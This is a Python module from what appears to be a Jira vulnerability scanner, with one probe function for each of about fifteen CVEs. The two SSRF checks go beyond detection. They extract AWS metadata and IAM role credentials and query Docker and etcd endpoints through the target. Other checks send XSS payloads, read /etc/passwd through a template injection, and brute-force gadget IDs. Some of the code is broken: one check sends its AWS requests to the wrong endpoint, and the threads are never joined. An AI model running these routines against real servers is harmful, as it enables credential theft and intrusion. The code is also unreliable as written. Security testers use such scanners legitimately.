import argparse
import json
import os
import socket
import sys
import threading
import time
from typing import Any, reveal_type
from urllib.parse import urlparse

import progressbar
import requests

from src.cheks.config import HEADERS, Colors, AWSConfig
from src.cheks.cve_cheks.isaws import isaws


def CVE_2017_9506(base_url: str) -> dict | None:
    to_load = "https://google.com"
    test_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}"

    print(f"[*] Checking CVE-2017-9506 SSRF at {test_url}")
    r = requests.get(test_url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200 and "googlelogo" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN}[CRITICAL]{Colors.RESET} Vulnerable To CVE-2017-9506 (SSRF): {test_url}")
        finding = {
            "title": "Vulnerable To CVE-2017-9506 (SSRF)",
            "severity": "CRITICAL",
            "target_url": test_url,
            "aws": {},
            "other_services": []
        }

        print("\tChecking For AWS Metadata Extraction")
        if isaws(base_url):
            print("\tAWS Instance Found")
            print("\tExfiltrating Data from the Instance")

            aws_instance_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.BASE}"
            r_instance = requests.get(aws_instance_url, allow_redirects=False, headers=HEADERS)
            aws_instance = r_instance.text if r_instance.status_code == 200 else None
            if aws_instance:
                print(f"\tAWS INSTANCE Recovered: {aws_instance_url}")

            aws_metadata_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.METADATA}"
            r_metadata = requests.get(aws_metadata_url, allow_redirects=False, headers=HEADERS)
            aws_metadata = r_metadata.text if r_metadata.status_code == 200 else None
            if aws_metadata:
                print(f"\tAWS Metadata Recovered: {aws_metadata_url}")

            aws_iam_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.IAM_ROLE}"
            r_iam = requests.get(aws_iam_url, allow_redirects=False, headers=HEADERS)
            aws_iam_data = r_iam.text if r_iam.status_code == 200 else None
            if aws_iam_data:
                print(f"\tAWS IAM DATA Recovered: {aws_iam_url}")

            finding["aws"] = {
                "instance": aws_instance,
                "metadata": aws_metadata,
                "iam_data": aws_iam_data,
            }
        else:
            print("\tNo AWS instance detected")

        exfil_tests = [
            ("http://100.100.100.200/latest/meta-data/", "Alibaba Metadata"),
            ("http://127.0.0.1:2375/v1.24/containers/json", "Docker Container Lists"),
            ("http://127.0.0.1:2379/v2/keys/?recursive=true", "Kubernetes ETCD API keys"),
        ]

        for target_url, description in exfil_tests:
            print(f"\tChecking for {description}")
            full_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={target_url}"
            r = requests.get(full_url, allow_redirects=False, headers=HEADERS)
            if r.status_code == 200:
                print(f"\t----> {description} Recovered: {full_url}")
                finding["other_services"].append({
                    "description": description,
                    "url": full_url,
                })
            else:
                print(f"\t----> {description} Not Found")

        return finding

    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2017-9506")
        return None


def CVE_2019_8449(base_url: str) -> dict[str, str] | None:
    url = f"{base_url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200:
        if "You are not authenticated. Authentication required to perform this operation." in r.text:
            print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8449")
            return None
        else:
            print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2019-8449 : {url}")
            finding = {
                "title": "Vulnerable To CVE-2019-8449",
                "severity": "LOW",
                "target-url": url,
            }
            return finding
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8449")
        return None


def CVE_2019_8442(base_url: str) -> dict[str, str] | None:
    url = f"{base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code != 200:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8442")
        return None
    else:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2019-8442 : {url}")
        finding = {
            "title": "Vulnerable To CVE-2019-8442",
            "severity": "LOW",
            "target-url": url,
        }
        return finding


def CVE_2019_8443(base_url: str) -> dict[str, str] | None:
    url = f"{base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200 or "<project" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2019-8443 : {url}")
        finding = {
            "title": "Vulnerable To CVE-2019-8443",
            "severity": "LOW",
            "target-url": url,
        }
        return finding
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8443")
        return None


def CVE_2019_8451(base_url: str) -> dict | None:
    to_load = "https://google.com"
    test_url = f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}"

    print(f"[*] Checking CVE-2019-8451 SSRF at {test_url}")
    r = requests.get(test_url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200 and "googlelogo" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN}[CRITICAL]{Colors.RESET} Vulnerable To CVE-2019-8451 (SSRF): {test_url}")
        finding = {
            "title": "Vulnerable To CVE-2019-8451 (SSRF)",
            "severity": "CRITICAL",
            "target_url": test_url,
            "aws": {},
            "other_services": []
        }

        print("\tChecking For AWS Metadata Extraction")
        if isaws(base_url):
            print("\tAWS Instance Found")
            print("\tExfiltrating Data from the Instance")

            aws_data = {}

            aws_instance_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.BASE}"
            r_instance = requests.get(aws_instance_url, allow_redirects=False, headers=HEADERS)
            if r_instance.status_code == 200:
                print(f"\tAWS INSTANCE Recovered: {aws_instance_url}")
                aws_data["instance_url"] = aws_instance_url
                aws_data["instance_data"] = r_instance.text

            aws_metadata_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.METADATA}"
            r_metadata = requests.get(aws_metadata_url, allow_redirects=False, headers=HEADERS)
            if r_metadata.status_code == 200:
                print(f"\tAWS Metadata Recovered: {aws_metadata_url}")
                aws_data["metadata_url"] = aws_metadata_url
                aws_data["metadata_data"] = r_metadata.text

            aws_iam_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.IAM_ROLE}"
            r_iam = requests.get(aws_iam_url, allow_redirects=False, headers=HEADERS)
            if r_iam.status_code == 200:
                print(f"\tAWS IAM DATA Recovered: {aws_iam_url}")
                aws_data["iam_url"] = aws_iam_url
                aws_data["iam_data"] = r_iam.text

            finding["aws"] = aws_data
        else:
            print("\tNo AWS instance detected")

        exfil_targets = [
            ("http://100.100.100.200/latest/meta-data/", "Alibaba Metadata"),
            ("http://127.0.0.1:2375/v1.24/containers/json", "Docker Container Lists"),
            ("http://127.0.0.1:2379/v2/keys/?recursive=true", "Kubernetes ETCD API keys")
        ]

        for target_url, description in exfil_targets:
            print(f"\tChecking for {description}")
            full_url = f"{base_url}/plugins/servlet/gadgets/makeRequest?url={target_url}"
            r = requests.get(full_url, allow_redirects=False, headers=HEADERS)
            if r.status_code == 200:
                print(f"\t{description} Found: {full_url}")
                finding["other_services"].append({
                    "description": description,
                    "url": full_url,
                    "response": r.text  # При необходимости можно убрать response, если он большой
                })
            else:
                print(f"\t{description} Not Found")

        return finding
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8451")
        return None


def CVE_2019_3403(base_url: str) -> dict[str, str] | None:
    url = f"{base_url}/rest/api/2/user/picker?query=admin"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if "The user named '{0}' does not exist" in r.text or "errorMessages" in r.text:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-3403")
        return None
    else:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2019-3403 : {url}")
        finding = {
            "title": "Vulnerable To CVE-2019-3403",
            "severity": "LOW",
            "target-url": url,
        }
        return finding


def CVE_2019_3402(base_url: str) -> dict[str, str] | None:
    url = (
        f"{base_url}/secure/ConfigurePortalPages!default.jspa"
        f"?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS\")%3C%2fscript%3Et1nmk&Search=Search"
    )
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if "XSS" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN} [HIGH]{Colors.RESET} Vulnerable To CVE-2019-3402 [Maybe] : {url}")
        finding = {
            "title": "Vulnerable To CVE-2019-3402 [Confirm Manually]",
            "severity": "HIGH",
            "target-url": url,
        }
        return finding
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-3402")
        return None


def CVE_2019_11581(base_url: str) -> dict[str, str] | None:
    url = f"{base_url}/secure/ContactAdministrators!default.jspa"
    r = requests.get(url, allow_redirects=False)

    if r.status_code == 200:
        if "Your Jira administrator" in r.text or "Contact Site Administrators" in r.text:
            print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-11581")
            return None
        else:
            print(
                f"{Colors.RED}[+] {Colors.GREEN} [CRITICAL]{Colors.RESET} Vulnerable To CVE-2019-11581 [Confirm Manually] : {url}")
            finding = {
                "title": "Vulnerable To CVE-2019-11581 [Confirm Manually]",
                "severity": "CRITICAL",
                "target-url": url,
            }
            return finding
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-11581")
        return None


def CVE_2020_14179(base_url: str) -> dict[str, str] | None:
    url = f"{base_url}/secure/QueryComponent!Default.jspa"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2020-14179 : {url}")
        finding = {
            "title": "Vulnerable To CVE-2020-14179",
            "severity": "LOW",
            "target-url": url,
        }
        return finding
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2020-14179")
        return None


def CVE_2020_14181(base_url: str) -> dict[str, str] | None:
    url = f"{base_url}/secure/ViewUserHover.jspa?username=Admin"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code != 200 or "Your session has timed out" in r.text:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2020-14181")
        return None
    else:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2020-14181 : {url}")
        finding = {
            "title": "Vulnerable To CVE-2020-14181",
            "severity": "LOW",
            "target-url": url,
        }
        return finding


def CVE_2018_20824(base_url: str) -> dict[str, str] | None:
    print("")
    url = (
        f"{base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000"
        f"&cyclePeriod=alert(\"XSS_POPUP\")"
    )
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if "XSS_POPUP" in r.text:
        print(
            f"{Colors.RED}[+] {Colors.GREEN} [HIGH]{Colors.RESET} Vulnerable To CVE-2018-20824 : {url}"
        )
        finding = {
            "title": "Vulnerable To CVE-2018-20824",
            "severity": "HIGH",
            "target-url": url,
        }
        return finding
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2018-20824")
        return None


def CVE_2019_3396(base_url: str) -> dict[str, str] | None:
    preview_url = f"{base_url}/rest/tinymce/1/macro/preview"
    body = {
        "contentId": "1",
        "macro": {
            "name": "widget",
            "params": {
                "url": "https://google.com",
                "width": "1000",
                "height": "1000",
                "_template": "file:///etc/passwd"
            },
            "body": ""
        }
    }

    # Initial GET to establish session
    r = requests.get(preview_url, allow_redirects=False, headers=HEADERS)
    if r.status_code != 200:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-3396")
        return None

    # Then try POST
    r = requests.post(preview_url, json=body, headers=HEADERS)
    if "root:" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN} [CRITICAL]{Colors.RESET} Vulnerable To CVE-2019-3396 : {preview_url}")
        finding = {
            "title": "Vulnerable To CVE-2019-3396",
            "severity": "CRITICAL",
            "target-url": preview_url,
        }
        return finding
    return None


def CVE_2020_36287(base_url: str, gadget_id: str, results: list[str]) -> None:
    try:
        url = f"{base_url}/rest/dashboards/1.0/10000/gadget/{gadget_id}/prefs"
        r = requests.get(url)
        if r.status_code == 200 and "userPrefsRepresentation" in r.text:
            results.append(f"{url}")
    except Exception:
        pass


def CVE_2020_36287_helper(base_url: str) -> list[Any]:
    widgets = ['BruteForcing Gadget ID... ', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()

    time.sleep(0.1)
    bar.update(50)

    threads: list[threading.Thread] = []
    results: list[str] = []
    gadget_ids = range(10000, 10500)
    lock = threading.Lock()

    for i, gadget_id in enumerate(gadget_ids, 1):
        t = threading.Thread(target=CVE_2020_36287, args=(base_url, str(gadget_id), results))
        t.start()
        threads.append(t)
        bar.update(i * 100 // len(gadget_ids))

    findings_list = []
    for url in results:
        findings_list.append({
            "title": "Vulnerable To CVE_2020_36287",
            "severity": "MEDIUM",
            "target-url": url,
        })
    return findings_list


def CVE_2020_36289(base_url: str) -> dict[str, str] | None:
    url = f"{base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin"
    r = requests.get(url)
    if r.status_code == 200 and "Assignee" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN} [MEDIUM]{Colors.RESET} Vulnerable To CVE-2020-36289 : {url}")
        finding = {
            "title": "Vulnerable To CVE-2020-36289",
            "severity": "MEDIUM",
            "target-url": url
        }
        return finding
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2020-36289")
        return None
